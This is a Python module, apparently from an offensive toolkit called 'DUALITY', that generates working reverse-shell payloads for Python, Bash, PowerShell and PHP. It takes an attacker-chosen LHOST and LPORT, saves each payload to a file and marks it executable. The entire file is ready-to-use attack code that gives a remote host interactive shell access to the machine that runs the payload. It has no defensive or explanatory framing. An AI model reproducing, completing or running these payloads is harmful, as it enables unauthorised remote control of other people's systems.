#!/usr/bin/env python3
# Payload Generator Module

import os
import time
from core.colors import Colors
from core.utils import save_file
from config.settings import PAYLOAD_DIR

class PayloadGenerator:
    def __init__(self):
        self.name = "Payload Generator"
    
    def run(self):
        print(f"\n{Colors.CYAN}[*] {self.name}{Colors.END}")
        print(f"{Colors.GREEN}[1] Python Reverse Shell")
        print(f"{Colors.GREEN}[2] Bash Reverse Shell")
        print(f"{Colors.GREEN}[3] PowerShell Reverse Shell")
        print(f"{Colors.GREEN}[4] PHP Reverse Shell")
        
        choice = input(f"\n{Colors.RED}DUALITY{Colors.WHITE}➤ {Colors.END}")
        lhost = input(f"{Colors.GREEN}LHOST > {Colors.END}")
        lport = input(f"{Colors.GREEN}LPORT > {Colors.END}")
        
        payloads = {
            '1': f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])''',
            '2': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            '3': f'''$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()''',
            '4': f'''<?php
set_time_limit(0);
$ip='{lhost}';
$port={lport};
$fp=fsockopen($ip,$port,$errno,$errstr);
if(!$fp){{die();}}
while(!feof($fp)){{
    $cmd=fgets($fp,1024);
    $output=shell_exec($cmd);
    fwrite($fp,$output);
}}
fclose($fp);
?>'''
        }
        
        ext = {'1': 'py', '2': 'sh', '3': 'ps1', '4': 'php'}
        lang = {'1': 'Python', '2': 'Bash', '3': 'PowerShell', '4': 'PHP'}
        
        payload = payloads.get(choice, payloads['1'])
        filename = f"{PAYLOAD_DIR}/payload_{lang[choice]}_{int(time.time())}.{ext[choice]}"
        save_file(payload, filename)
        os.chmod(filename, 0o755)
        
        print(f"\n{Colors.GREEN}[+] Payload saved: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Type: {lang[choice]} Reverse Shell{Colors.END}")
